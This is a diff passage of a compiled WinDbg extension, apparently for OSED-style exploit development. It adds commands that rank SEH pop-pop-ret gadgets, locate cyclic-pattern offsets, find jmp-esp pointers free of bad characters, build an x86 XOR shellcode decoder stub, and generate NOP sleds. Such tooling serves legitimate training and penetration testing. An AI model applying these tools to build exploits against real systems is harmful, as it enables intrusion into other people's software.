+          return { command: "help", args: options, success: true, findings: [...groups.values()].flat(), warnings: [], errors: [], schema: { command: { type: "string", optional: true }, mode: { type: "string", optional: true } } };
+        }
+        if (commandName.toLowerCase() === "all") {
+          const groups = groupedDocuments(registry2);
+          print2(renderAll(groups));
+          return { command: "help", args: options, success: true, findings: [...groups.values()].flat(), warnings: [], errors: [] };
+        }
+        if (mode && mode.toLowerCase() !== "full")
+          return { command: "help", args: options, success: false, findings: [], warnings: [], errors: [`Unknown help mode '${mode}'. Use 'full'.`] };
+        const all = documents(registry2);
+        if (commandName.startsWith("?")) {
+          const query = commandName.slice(1).trim();
+          if (!query)
+            return { command: "help", args: options, success: false, findings: [], warnings: [], errors: ["Search query cannot be empty."] };
+          const matches = searchDocuments(query, all);
+          print2(renderSearch(query, groupByCategory(matches), matches.length));
+          return { command: "help", args: options, success: true, findings: matches, warnings: [], errors: [] };
+        }
+        const namespace = namespaceDocuments(commandName, all);
+        if (namespace) {
+          print2(renderNamespace(commandName, namespace));
+          return { command: "help", args: options, success: true, findings: [...namespace.values()].flat(), warnings: [], errors: [] };
+        }
+        const command2 = registry2.get(commandName);
+        const helper = findHelpEntry(commandName === "rop" ? "rop.find" : commandName);
+        if (!command2 && !helper) {
+          const suffix = commandName.toLowerCase();
+          const matches = all.filter((entry) => entry.name.toLowerCase().endsWith(`.${suffix}`));
+          if (matches.length === 1) {
+            const resolved = matches[0];
+            const resolvedHelper = findHelpEntry(resolved.name);
+            const resolvedCommand = registry2.get(resolved.name);
+            print2((mode == null ? void 0 : mode.toLowerCase()) === "full" ? renderFullDetail(resolved) : renderCompactDetail(resolved));
+            return resolvedHelper ? { command: "help", args: options, success: true, findings: helpRows(resolvedHelper), warnings: [], errors: [] } : { command: "help", args: options, success: true, findings: [{ name: resolvedCommand.name, description: resolvedCommand.description, usage: resolvedCommand.usage, examples: resolvedCommand.examples, schema: resolvedCommand.schema }], warnings: [], errors: [], schema: resolvedCommand.schema };
+          }
+          if (matches.length > 1) {
+            print2(renderCandidates(commandName, matches));
+            return { command: "help", args: options, success: false, findings: matches, warnings: [], errors: [`'${commandName}' matches multiple commands.`] };
+          }
+          return { command: "help", args: options, success: false, findings: [], warnings: [], errors: [`Unknown command '${commandName}'.`] };
+        }
+        const document = helper ? toDocument(helper) : registryDocument(command2);
+        print2((mode == null ? void 0 : mode.toLowerCase()) === "full" ? renderFullDetail(document) : renderCompactDetail(document));
+        if (helper)
+          return { command: "help", args: options, success: true, findings: helpRows(helper), warnings: [], errors: [] };
+        return { command: "help", args: options, success: true, findings: [{ name: command2.name, description: command2.description, usage: command2.usage, examples: command2.examples, schema: command2.schema }], warnings: [], errors: [], schema: command2.schema };
+      }
+    };
+  }
+
+  // src/commands/reload.ts
+  function createReloadCommand(registry2) {
+    return {
+      name: "reload",
+      description: "Clear and re-register command registry.",
+      usage: "dx @$osed().reload()",
+      examples: ["dx @$osed().reload()"],
+      schema: {},
+      execute(options) {
+        var _a, _b;
+        const result3 = registry2.reload();
+        result3.args = options;
+        section("Reload");
+        if (result3.success) {
+          info(`Re-registered ${(_b = (_a = result3.findings[0]) == null ? void 0 : _a.commandCount) != null ? _b : 0} commands.`);
+        } else {
+          for (const err of result3.errors) {
+            error(err);
+          }
+        }
+        whyItMatters("Fast in-session reload shortens debug-iterate-test cycles.");
+        return result3;
+      }
+    };
+  }
+
+  // src/commands/seh_ppr.ts
+  function addressBytes(address, pointerSize) {
+    const bytes = [];
+    for (let i = 0; i < pointerSize; i += 1) {
+      bytes.push(Number(__bi.and(__bi.shr(address, __bi(i * 8)), __bi(255))));
+    }
+    return bytes;
+  }
+  function isBadcharSafe(address, pointerSize, exclude) {
+    if (exclude.length === 0) {
+      return true;
+    }
+    const blocked2 = new Set(exclude);
+    return !addressBytes(address, pointerSize).some((value) => blocked2.has(value));
+  }
+  function scoreFinding(badcharSafe, aslr, safeseh) {
+    let score = 0;
+    const reasons = [];
+    if (badcharSafe) {
+      score += 35;
+      reasons.push("address bytes avoid excluded badchars");
+    } else {
+      score -= 40;
+      reasons.push("address bytes contain excluded badchars");
+    }
+    if (aslr === "disabled") {
+      score += 25;
+      reasons.push("module has ASLR disabled");
+    } else if (aslr === "unknown") {
+      score += 5;
+      reasons.push("module ASLR state unknown");
+    } else {
+      score -= 20;
+      reasons.push("module has ASLR enabled");
+    }
+    if (safeseh === "disabled") {
+      score += 30;
+      reasons.push("module SafeSEH is disabled");
+    } else if (safeseh === "unknown") {
+      score += 10;
+      reasons.push("module SafeSEH state unknown");
+    } else {
+      score -= 40;
+      reasons.push("module SafeSEH is enabled");
+    }
+    return { score, reasons };
+  }
+  function normalizeMode(value) {
+    return value === "thorough" ? "thorough" : "fast";
+  }
+  function createSehPprCommand() {
+    return {
+      name: "seh_ppr",
+      description: "Find and rank pop-pop-ret candidates for SEH workflows.",
+      usage: "dx @$osed().seh_ppr('libspp.dll', '00 0A 0D', 50, true, 'fast')",
+      examples: ["dx @$osed().seh_ppr()", "dx @$osed().seh_ppr('libspp.dll', '00 0A 0D', 100, true, 'thorough')"],
+      schema: {
+        module: { type: "string" },
+        exclude: { type: "array", elementType: "number", default: [] },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        executableOnly: { type: "boolean", default: true },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        var _a, _b, _c, _d, _e, _f, _g;
+        const pointerSize = getPointerSize();
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : []);
+        const executableOnly = (_b = options.executableOnly) != null ? _b : true;
+        const maxResults = Math.min((_c = options.maxResults) != null ? _c : 50, 200);
+        const mode = normalizeMode(options.mode);
+        const moduleFilter = options.module;
+        const warnings = [];
+        if (normalizedExclude.warning) {
+          warnings.push(normalizedExclude.warning);
+        }
+        const findings = [];
+        const seen = /* @__PURE__ */ new Set();
+        const patterns = knownPatterns().filter((p) => /^pop \w+ ; pop \w+ ; ret$/.test(p.mnemonic)).map((p) => p.bytes);
+        for (const pattern of patterns) {
+          if (findings.length >= maxResults) {
+            break;
+          }
+          const remaining = Math.max(1, maxResults - findings.length);
+          const scan = scanPattern({
+            module: moduleFilter,
+            executableOnly,
+            maxResults: remaining,
+            chunkSize: mode === "thorough" ? 4096 : 16384
+          }, Uint8Array.from(pattern));
+          warnings.push(...scan.warnings.map((warning) => `${warning.region}: ${warning.message}`));
+          for (const hit of scan.hits) {
+            const key2 = hit.toString();
+            if (seen.has(key2)) {
+              continue;
+            }
+            seen.add(key2);
+            const candidate = tryReadMemory(hit, 3);
+            if (!candidate) {
+              continue;
+            }
+            const validated = validateInstructionCandidate(candidate, true, true);
+            if (!validated.flags.decoded || !validated.flags.mnemonicMatch || !validated.flags.executable) {
+              continue;
+            }
+            const moduleInfo = findModuleByAddress(hit);
+            const moduleName = (_d = moduleInfo == null ? void 0 : moduleInfo.name) != null ? _d : "<outside module>";
+            const moduleOffset2 = moduleInfo ? `0x${(hit - moduleInfo.base).toString(16).toUpperCase()}` : "n/a";
+            const aslr = (_e = moduleInfo == null ? void 0 : moduleInfo.aslr) != null ? _e : "unknown";
+            const safeseh = (_f = moduleInfo == null ? void 0 : moduleInfo.safeseh) != null ? _f : "unknown";
+            const badcharSafe = isBadcharSafe(hit, pointerSize, normalizedExclude.values);
+            const scored = scoreFinding(badcharSafe, aslr, safeseh);
+            findings.push({
+              address: hit,
+              module: moduleName,
+              module_offset: moduleOffset2,
+              instructions: (_g = validated.mnemonic) != null ? _g : "pop ? ; pop ? ; ret",
+              badchar_safe: badcharSafe,
+              aslr,
+              safeseh,
+              score: scored.score,
+              reasons: scored.reasons
+            });
+            if (findings.length >= maxResults) {
+              break;
+            }
+          }
+        }
+        findings.sort((a, b) => {
+          if (a.score !== b.score) {
+            return b.score - a.score;
+          }
+          return a.address < b.address ? -1 : 1;
+        });
+        section("SEH PPR Candidates");
+        table([
+          { key: "rank", header: "Rank", width: 6 },
+          { key: "address", header: "Address", width: 18 },
+          { key: "module", header: "Module", width: 18 },
+          { key: "offset", header: "Offset", width: 12 },
+          { key: "instr", header: "Instructions", width: 24 },
+          { key: "badchar", header: "BadChar", width: 8 },
+          { key: "aslr", header: "ASLR", width: 8 },
+          { key: "safeseh", header: "SafeSEH", width: 8 },
+          { key: "score", header: "Score", width: 6 }
+        ], findings.map((finding, index) => ({
+          rank: `${index + 1}`,
+          address: formatAddress(finding.address, pointerSize),
+          module: finding.module,
+          offset: finding.module_offset,
+          instr: finding.instructions,
+          badchar: finding.badchar_safe ? "safe" : "bad",
+          aslr: finding.aslr,
+          safeseh: finding.safeseh,
+          score: `${finding.score}`
+        })));
+        whyItMatters("Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation.");
+        return {
+          command: "seh_ppr",
+          args: __spreadProps(__spreadValues({}, options), {
+            exclude: normalizedExclude.values,
+            executableOnly,
+            maxResults,
+            mode
+          }),
+          success: true,
+          findings,
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/exploit.ts
+  function result2(args, commands) {
+    return {
+      command: "exploit",
+      args,
+      success: true,
+      findings: [{ commands }],
+      warnings: [],
+      errors: []
+    };
+  }
+  function createExploitCommand() {
+    return {
+      name: "exploit",
+      description: "Emit deterministic exploit-development command workflows.",
+      usage: "dx @$osed().exploit(mode, tag?, offset?, address?)",
+      examples: [
+        'dx @$osed().exploit("egghunter", "W00T", 260)',
+        'dx @$osed().exploit("offset")',
+        'dx @$osed().exploit("badchars", "", 0, 0x00B8F900)'
+      ],
+      schema: {
+        mode: { type: "string", enum: ["egghunter", "offset", "badchars"], required: true },
+        tag: { type: "string" },
+        offset: { type: "number" },
+        address: { type: "number" }
+      },
+      execute(options) {
+        const mode = options.mode;
+        const tag = options.tag || "W00T";
+        const offset = options.offset;
+        const address = options.address;
+        let commands = [];
+        if (mode === "egghunter") {
+          commands = [
+            `dx @$osed().egghunter("${tag}")`
+          ];
+        } else if (mode === "offset") {
+          commands = ["dx @$osed().pattern_create(300)", "dx @$osed().pattern_offset(<value>)"];
+        } else if (mode === "badchars") {
+          if (address === void 0) {
+            throw new Error("exploit.badchars requires address.");
+          }
+          commands = [`dx @$osed().badchars(${address})`];
+        } else {
+          throw new Error(`Unsupported exploit mode: ${String(mode)}`);
+        }
+        for (const command2 of commands) {
+          print(command2);
+        }
+        return result2(options, commands);
+      }
+    };
+  }
+
+  // src/logic/pattern_scan_logic.ts
+  var CYCLIC_MAX_LENGTH = 62 * 62 * 62;
+  function buildHaystacks(length) {
+    const requested = Number.isFinite(length) ? Math.trunc(length) : 0;
+    return {
+      msf: generateMsfPattern(Math.max(4, Math.min(requested, MSF_MAX_LENGTH))),
+      cyclic: generateCyclicPattern(Math.max(4, Math.min(Math.max(requested, 2e4), CYCLIC_MAX_LENGTH)))
+    };
+  }
+  function confidenceFor(haystack, needle, firstOffset) {
+    return haystack.indexOf(needle, firstOffset + 1) === -1 ? "EXACT" : "CONSERVATIVE";
+  }
+  function matchRegisterValue(low322, haystacks) {
+    const needle = decodeOffsetNeedle(low322 >>> 0);
+    for (const kind of ["msf", "cyclic"]) {
+      const offset = haystacks[kind].indexOf(needle);
+      if (offset >= 0) {
+        return { kind, offset, confidence: confidenceFor(haystacks[kind], needle, offset) };
+      }
+    }
+    return void 0;
+  }
+  function bufferToLatin1(buffer) {
+    let text = "";
+    for (let index = 0; index < buffer.length; index += 1) {
+      text += String.fromCharCode(buffer[index]);
+    }
+    return text;
+  }
+  function locatePatternInBuffer(buffer, haystacks, maxProbe = 64) {
+    const text = bufferToLatin1(buffer);
+    const cap = Math.min(text.length, maxProbe);
+    for (const kind of ["msf", "cyclic"]) {
+      const haystack = haystacks[kind];
+      for (let length = cap; length >= 4; length -= 1) {
+        const needle = text.slice(0, length);
+        const offset = haystack.indexOf(needle);
+        if (offset >= 0) {
+          return { kind, offset, length, confidence: confidenceFor(haystack, needle, offset) };
+        }
+      }
+    }
+    return void 0;
+  }
+  function dwordAt(buffer, index) {
+    if (index < 0 || index + 4 > buffer.length) {
+      return void 0;
+    }
+    return (buffer[index] | buffer[index + 1] << 8 | buffer[index + 2] << 16 | buffer[index + 3] << 24) >>> 0;
+  }
+
+  // src/commands/findmsp.ts
+  var MIN_POINTER = __bi(65536);
+  var MAX_STACK_MATCHES = 100;
+  function low32(value) {
+    return Number(__bi.and(value, __bi(4294967295))) >>> 0;
+  }
+  function scanRegisters(regs, haystacks, probeBytes) {
+    const matches = [];
+    for (const register2 of regs.all) {
+      const direct = matchRegisterValue(low32(register2.value), haystacks);
+      if (direct) {
+        matches.push({
+          source: register2.name.toLowerCase(),
+          type: "register",
+          kind: direct.kind,
+          offset: direct.offset,
+          confidence: direct.confidence,
+          detail: "register overwritten with pattern bytes"
+        });
+        continue;
+      }
+      if (register2.value < MIN_POINTER) {
+        continue;
+      }
+      const buffer = tryReadMemory(register2.value, probeBytes);
+      if (!buffer) {
+        continue;
+      }
+      const located = locatePatternInBuffer(buffer, haystacks);
+      if (located) {
+        matches.push({
+          source: register2.name.toLowerCase(),
+          type: "pointer",
+          kind: located.kind,
+          offset: located.offset,
+          confidence: located.confidence,
+          detail: `points into pattern (${located.length} contiguous bytes readable)`
+        });
+      }
+    }
+    return matches;
+  }
+  function scanStack(regs, haystacks, stackBytes) {
+    var _a;
+    if (regs.sp === void 0) {
+      return { matches: [], truncated: false, readable: false };
+    }
+    const buffer = tryReadMemory(regs.sp, stackBytes);
+    if (!buffer) {
+      return { matches: [], truncated: false, readable: false };
+    }
+    const label = ((_a = regs.spName) != null ? _a : "sp").toLowerCase();
+    const matches = [];
+    let truncated = false;
+    for (let index = 0; index + 4 <= buffer.length; index += 4) {
+      const value = dwordAt(buffer, index);
+      if (value === void 0) {
+        continue;
+      }
+      const match = matchRegisterValue(value, haystacks);
+      if (!match) {
+        continue;
+      }
+      if (matches.length >= MAX_STACK_MATCHES) {
+        truncated = true;
+        break;
+      }
+      matches.push({
+        source: `${label}+0x${index.toString(16)}`,
+        type: "stack",
+        kind: match.kind,
+        offset: match.offset,
+        confidence: match.confidence,
+        detail: "stack slot holds pattern bytes"
+      });
+    }
+    return { matches, truncated, readable: true };
+  }
+  function scanSeh(pointerSize, haystacks) {
+    if (pointerSize !== 4) {
+      return { matches: [] };
+    }
+    const teb = resolveTeb32Address(host.currentThread);
+    if (!teb) {
+      return { matches: [], warning: "TEB unavailable for SEH walk." };
+    }
+    try {
+      const records = readSehRecords(teb, 3);
+      const matches = [];
+      records.forEach((record, index) => {
+        const fields = [
+          { name: "next", value: record.next },
+          { name: "handler", value: record.handler }
+        ];
+        for (const field of fields) {
+          const match = matchRegisterValue(low32(field.value), haystacks);
+          if (match) {
+            matches.push({
+              source: `seh[${index}].${field.name}`,
+              type: "seh",
+              kind: match.kind,
+              offset: match.offset,
+              confidence: match.confidence,
+              detail: "SEH record field holds pattern bytes"
+            });
+          }
+        }
+      });
+      return { matches };
+    } catch (error2) {
+      const message = error2 instanceof Error ? error2.message : String(error2);
+      return { matches: [], warning: `SEH read failed: ${message}` };
+    }
+  }
+  function createFindMspCommand() {
+    return {
+      name: "findmsp",
+      description: "Comprehensive cyclic-pattern offset scan across registers, the stack, SEH, and pointer targets.",
+      usage: "dx @$osed().findmsp(patternLength?, stackBytes?, probeBytes?)",
+      examples: ["dx @$osed().findmsp()", "dx @$osed().findmsp(20000, 4096)"],
+      schema: {
+        patternLength: { type: "number", min: 256, max: 1e5, default: 1e4 },
+        stackBytes: { type: "number", min: 128, max: 8192, default: 2048 },
+        probeBytes: { type: "number", min: 8, max: 256, default: 32 }
+      },
+      execute(options) {
+        var _a;
+        const pointerSize = getPointerSize();
+        const patternLength = options.patternLength;
+        const stackBytes = options.stackBytes;
+        const probeBytes = options.probeBytes;
+        const haystacks = buildHaystacks(patternLength);
+        const regs = readRegisters(pointerSize);
+        const registerMatches = scanRegisters(regs, haystacks, probeBytes);
+        const stack = scanStack(regs, haystacks, stackBytes);
+        const seh = scanSeh(pointerSize, haystacks);
+        const matches = [...registerMatches, ...stack.matches, ...seh.matches];
+        const ipName = ((_a = regs.ipName) != null ? _a : pointerSize === 8 ? "rip" : "eip").toLowerCase();
+        const ipMatch = registerMatches.find((match) => match.source === ipName && match.type === "register");
+        section("INSTRUCTION POINTER");
+        if (ipMatch) {
+          print(`${ipName.toUpperCase()} overwritten at pattern offset ${ipMatch.offset} (${ipMatch.kind}, ${ipMatch.confidence}).`);
+        } else {
+          print(`${ipName.toUpperCase()} does not hold cyclic-pattern bytes.`);
+        }
+        section("PATTERN MATCHES");
+        if (matches.length === 0) {
+          print("No cyclic-pattern evidence found in registers, stack, SEH, or pointer targets.");
+        } else {
+          table([
+            { key: "source", header: "Source", width: 16 },
+            { key: "type", header: "Where", width: 10 },
+            { key: "offset", header: "Offset", width: 8 },
+            { key: "kind", header: "Pattern", width: 8 },
+            { key: "confidence", header: "Conf", width: 12 },
+            { key: "detail", header: "Detail" }
+          ], matches.map((match) => ({
+            source: match.source,
+            type: match.type,
+            offset: `${match.offset}`,
+            kind: match.kind,
+            confidence: match.confidence,
+            detail: match.detail
+          })));
+        }
+        const warnings = [];
+        if (!stack.readable) {
+          warnings.push("Stack pointer memory was not readable; stack scan skipped.");
+        } else if (stack.truncated) {
+          warnings.push(`Stack scan stopped after ${MAX_STACK_MATCHES} matches; increase specificity or reduce stackBytes.`);
+        }
+        if (seh.warning) {
+          warnings.push(seh.warning);
+        }
+        return {
+          command: "findmsp",
+          args: options,
+          success: true,
+          findings: [
+            {
+              pointerSize,
+              instructionPointer: {
+                register: ipName,
+                value: regs.ip,
+                matched: ipMatch !== void 0,
+                offset: ipMatch == null ? void 0 : ipMatch.offset,
+                pattern: ipMatch == null ? void 0 : ipMatch.kind,
+                confidence: ipMatch == null ? void 0 : ipMatch.confidence
+              },
+              matches,
+              counts: {
+                register: registerMatches.filter((match) => match.type === "register").length,
+                pointer: registerMatches.filter((match) => match.type === "pointer").length,
+                stack: stack.matches.length,
+                seh: seh.matches.length
+              }
+            }
+          ],
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/logic/pointer_filter_logic.ts
+  var REGISTER_CODE = {
+    eax: 0,
+    ecx: 1,
+    edx: 2,
+    ebx: 3,
+    esp: 4,
+    ebp: 5,
+    esi: 6,
+    edi: 7,
+    rax: 0,
+    rcx: 1,
+    rdx: 2,
+    rbx: 3,
+    rsp: 4,
+    rbp: 5,
+    rsi: 6,
+    rdi: 7
+  };
+  function encodeJumpToRegister(kind, register2) {
+    const code = REGISTER_CODE[register2.trim().toLowerCase()];
+    if (code === void 0) {
+      return void 0;
+    }
+    switch (kind) {
+      case "jmp":
+        return [255, 224 + code];
+      case "call":
+        return [255, 208 + code];
+      case "pushret":
+        return [80 + code, 195];
+      default:
+        return void 0;
+    }
+  }
+  function encodeInstructionSearch(text) {
+    const parts = text.trim().toLowerCase().split(/\s+/);
+    if (parts.length !== 2) {
+      return void 0;
+    }
+    const [mnemonic, register2] = parts;
+    if (mnemonic === "jmp" || mnemonic === "call") {
+      return encodeJumpToRegister(mnemonic, register2);
+    }
+    if (mnemonic === "pushret" || mnemonic === "push+ret") {
+      return encodeJumpToRegister("pushret", register2);
+    }
+    return void 0;
+  }
+  function addressToBytes(address, pointerSize) {
+    const bytes = [];
+    let value = address;
+    for (let index = 0; index < pointerSize; index += 1) {
+      bytes.push(Number(__bi.and(value, __bi(255))));
+      value = __bi.shr(value, __bi(8));
+    }
+    return bytes;
+  }
+  function addressHasBadchar(address, pointerSize, badchars) {
+    if (badchars.length === 0) {
+      return false;
+    }
+    const bad = new Set(badchars.map((value) => value & 255));
+    return addressToBytes(address, pointerSize).some((byte) => bad.has(byte));
+  }
+  function badcharAddressFilter(badchars, pointerSize) {
+    return {
+      name: "badchar-free-address",
+      predicate: (candidate) => !addressHasBadchar(candidate.address, pointerSize, badchars)
+    };
+  }
+  function applyFilters(addresses, filters) {
+    const kept = [];
+    const rejected = [];
+    for (const address of addresses) {
+      const failing = filters.find((filter) => !filter.predicate({ address }));
+      if (failing) {
+        rejected.push({ address, failed: failing.name });
+      } else {
+        kept.push(address);
+      }
+    }
+    return { kept, rejected };
+  }
+
+  // src/commands/find_ptr.ts
+  function annotate(address, pointerSize) {
+    const module = findModuleByAddress(address);
+    if (!module) {
+      return formatAddress(address, pointerSize);
+    }
+    return `${module.name}+0x${(address - module.base).toString(16).toUpperCase()}`;
+  }
+  function resolvePattern(options) {
+    var _a;
+    if (typeof options.instruction === "string" && options.instruction.trim().length > 0) {
+      const encoded = encodeInstructionSearch(options.instruction);
+      if (!encoded) {
+        throw new Error(`Unrecognized instruction search '${options.instruction}'. Use e.g. 'jmp esp', 'call eax', 'pushret esp'.`);
+      }
+      return encoded;
+    }
+    const bytes = (_a = options.bytes) != null ? _a : [];
+    if (bytes.length === 0 || bytes.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) {
+      throw new Error("Provide an 'instruction' (e.g. 'jmp esp') or a non-empty 'bytes' array of 0x00..0xFF integers.");
+    }
+    return bytes;
+  }
+  function createFindPtrCommand() {
+    return {
+      name: "find_ptr",
+      description: "Search executable memory for an instruction or byte pattern and filter surviving pointers by bad characters.",
+      usage: "dx @$osed().find_ptr(instruction, module?, badchars?, maxResults?, executableOnly?)",
+      examples: [
+        'dx @$osed().find_ptr("jmp esp")',
+        'dx @$osed().find_ptr("call eax", "essfunc", "00 0A 0D")'
+      ],
+      schema: {
+        instruction: { type: "string" },
+        bytes: { type: "array", elementType: "number", default: [] },
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        badchars: { type: "array", elementType: "number", default: [] },
+        maxResults: { type: "number", min: 1, max: 200, default: 20 }
+      },
+      execute(options) {
+        var _a;
+        const pointerSize = getPointerSize();
+        const pattern = resolvePattern(options);
+        const normalizedExclude = normalizeByteArray((_a = options.badchars) != null ? _a : []);
+        const maxResults = options.maxResults;
+        const executableOnly = options.executableOnly !== false;
+        const scanCap = Math.min(Math.max(maxResults * 5, maxResults), 200);
+        const scan = scanPattern({
+          module: options.module,
+          executableOnly,
+          maxResults: scanCap,
+          chunkSize: 16384
+        }, Uint8Array.from(pattern));
+        const filters = [badcharAddressFilter(normalizedExclude.values, pointerSize)];
+        const outcome = applyFilters(scan.hits, filters);
+        const kept = outcome.kept.slice(0, maxResults);
+        section("Pointer Search");
+        info(`Pattern: ${pattern.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ")}`);
+        info(`Hits: ${scan.hits.length} scanned, ${outcome.rejected.length} rejected by bad chars, ${outcome.kept.length} surviving.`);
+        if (kept.length === 0) {
+          warn("No pointers survived the filter stack.");
+        } else {
+          table([
+            { key: "address", header: "Address", width: 18 },
+            { key: "location", header: "Location", width: 24 },
+            { key: "python", header: "Python", width: 14 }
+          ], kept.map((hit) => ({
+            address: formatAddress(hit, pointerSize),
+            location: annotate(hit, pointerSize),
+            python: `0x${hit.toString(16).toUpperCase()}`
+          })));
+        }
+        whyItMatters("Filtering pointers by bad characters up front prevents choosing an address the target will corrupt.");
+        const warnings = scan.warnings.map((warning) => `${warning.region}: ${warning.message}`);
+        if (normalizedExclude.warning) {
+          warnings.push(normalizedExclude.warning);
+        }
+        return {
+          command: "find_ptr",
+          args: __spreadProps(__spreadValues({}, options), { badchars: normalizedExclude.values }),
+          success: true,
+          findings: [
+            {
+              pattern,
+              badchars: normalizedExclude.values,
+              filters: filters.map((filter) => filter.name),
+              scanned: scan.hits.length,
+              rejected: outcome.rejected.length,
+              surviving: kept
+            }
+          ],
+          warnings,
+          errors: [],
+          stats: scan.stats
+        };
+      }
+    };
+  }
+
+  // src/commands/encode.ts
+  var MAX_SHELLCODE_LEN = 65535;
+  function buildXorStub(key2, payloadLen) {
+    const k = key2 & 255;
+    if (payloadLen <= 255) {
+      return [
+        235,
+        14,
+        // JMP SHORT to CALL (16)
+        94,
+        // POP ESI
+        49,
+        201,
+        // XOR ECX, ECX
+        177,
+        payloadLen,
+        // MOV CL, lo
+        128,
+        54,
+        k,
+        // XOR [ESI], key
+        70,
+        // INC ESI
+        226,
+        250,
+        // LOOP xor_byte
+        235,
+        6,
+        // JMP SHORT execute
+        144,
+        // NOP
+        232,
+        237,
+        255,
+        255,
+        255
+        // CALL decode_loop
+      ];
+    }
+    const lo = payloadLen & 255;
+    const hi = payloadLen >> 8 & 255;
+    return [
+      235,
+      16,
+      // JMP SHORT to CALL (18)
+      94,
+      // POP ESI
+      49,
+      201,
+      // XOR ECX, ECX
+      181,
+      hi,
+      // MOV CH, hi
+      177,
+      lo,
+      // MOV CL, lo
+      128,
+      54,
+      k,
+      // XOR [ESI], key
+      70,
+      // INC ESI
+      226,
+      250,
+      // LOOP xor_byte
+      235,
+      6,
+      // JMP SHORT execute
+      144,
+      // NOP
+      232,
+      235,
+      255,
+      255,
+      255
+      // CALL decode_loop
+    ];
+  }
+  function xorEncode(shellcode, key2) {
+    return shellcode.map((b) => (b ^ key2) & 255);
+  }
+  function findXorKey(shellcode, exclude, hint) {
+    const candidates2 = hint !== void 0 ? [hint & 255] : Array.from({ length: 255 }, (_, i) => i + 1);
+    for (const key2 of candidates2) {
+      if (key2 === 0 || exclude.has(key2))
+        continue;
+      if (xorEncode(shellcode, key2).every((b) => !exclude.has(b)))
+        return key2;
+    }
+    return void 0;
+  }
+  function parseShellcodeHex(raw) {
+    if (Array.isArray(raw)) {
+      return raw.map((b) => b & 255);
+    }
+    if (typeof raw !== "string" || !raw.trim()) {
+      throw new Error("shellcode must be a non-empty hex string or byte array.");
+    }
+    const hex4 = raw.replace(/[^0-9a-fA-F]/g, "");
+    if (hex4.length % 2 !== 0) {
+      throw new Error("shellcode hex string must have an even number of hex digits.");
+    }
+    const result3 = [];
+    for (let i = 0; i < hex4.length; i += 2) {
+      result3.push(parseInt(hex4.slice(i, i + 2), 16));
+    }
+    return result3;
+  }
+  function toPython(bytes) {
+    return `b"${bytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("")}"`;
+  }
+  function toHex(bytes) {
+    return bytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join(" ");
+  }
+  function createEncodeCommand() {
+    return {
+      name: "encode",
+      description: "XOR-encode shellcode to eliminate bad characters.",
+      usage: "dx @$osed().encode(shellcode, exclude?, key?)",
+      examples: [
+        'dx @$osed().encode("FC E8 82 00 00 00 60", "00 0A 0D")',
+        'dx @$osed().encode("FC E8", "00 0A 0D", 0x41)'
+      ],
+      schema: {
+        shellcode: { type: "string", required: true },
+        exclude: { type: "array", elementType: "number", default: [0, 10, 13] },
+        key: { type: "number" }
+      },
+      execute(options) {
+        var _a;
+        const shellcode = parseShellcodeHex(options.shellcode);
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : [0, 10, 13]);
+        const exclude = new Set(normalizedExclude.values);
+        const keyHint = options.key !== void 0 ? options.key & 255 : void 0;
+        const warnings = [];
+        if (normalizedExclude.warning)
+          warnings.push(normalizedExclude.warning);
+        if (shellcode.length === 0) {
+          throw new Error("shellcode is empty.");
+        }
+        if (shellcode.length > MAX_SHELLCODE_LEN) {
+          throw new Error(`Shellcode is ${shellcode.length} bytes; maximum supported is ${MAX_SHELLCODE_LEN}. Use msfvenom --encoder x86/xor_dynamic for very large payloads.`);
+        }
+        const key2 = findXorKey(shellcode, exclude, keyHint);
+        if (key2 === void 0) {
+          throw new Error(keyHint !== void 0 ? `Key 0x${keyHint.toString(16).toUpperCase().padStart(2, "0")} produces bad characters in the encoded output.` : `No XOR key in 0x01..0xFF eliminates all bad characters. Consider a different encoder or revising the bad character list.`);
+        }
+        const encoded = xorEncode(shellcode, key2);
+        const stub = buildXorStub(key2, shellcode.length);
+        const combined = [...stub, ...encoded];
+        const badStubBytes = stub.map((b, i) => ({ b, i })).filter(({ b }) => exclude.has(b));
+        if (badStubBytes.length > 0) {
+          const detail = badStubBytes.map(({ b, i }) => `0x${b.toString(16).toUpperCase().padStart(2, "0")} at stub[${i}]`).join(", ");
+          warnings.push(`Decoder stub contains bad byte(s): ${detail}. The stub will be corrupted when delivered through the vulnerable buffer.`);
+        }
+        section("XOR Encoder");
+        info(`Key:              0x${key2.toString(16).toUpperCase().padStart(2, "0")}`);
+        info(`Shellcode length: ${shellcode.length} bytes`);
+        info(`Stub size:        ${stub.length} bytes`);
+        info(`Total payload:    ${combined.length} bytes`);
+        section("Decoder Stub (hex)");
+        print(toHex(stub));
+        section("Encoded Shellcode (hex)");
+        print(toHex(encoded));
+        section("Combined Payload (Python)");
+        print(toPython(combined));
+        if (warnings.length > 0) {
+          section("Warnings");
+          for (const warning of warnings) {
+            warn(warning);
+          }
+        }
+        whyItMatters("XOR encoding transforms each shellcode byte to avoid characters that corrupt the delivery buffer.");
+        return {
+          command: "encode",
+          args: options,
+          success: true,
+          findings: [
+            {
+              key: key2,
+              keyHex: `0x${key2.toString(16).toUpperCase().padStart(2, "0")}`,
+              stubSize: stub.length,
+              encodedSize: encoded.length,
+              totalSize: combined.length,
+              stub,
+              encoded,
+              combined
+            }
+          ],
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/commands/nop.ts
+  function createNopCommand() {
+    return {
+      name: "nop",
+      description: "Generate a NOP sled of N bytes.",
+      usage: "dx @$osed().nop(16)",
+      examples: [
+        "dx @$osed().nop(16)",
+        "dx @$osed().nop(32)",
+        "dx @$osed().nop(16, 0x90)"
+      ],
+      schema: {
+        length: { type: "number", min: 1, max: 4096, required: true },
+        byte: { type: "number", default: 144 }
+      },
+      execute(options) {
+        var _a;
+        const length = options.length;
+        const nopByte = ((_a = options.byte) != null ? _a : 144) & 255;
+        const sled = Array.from({ length }, () => nopByte);
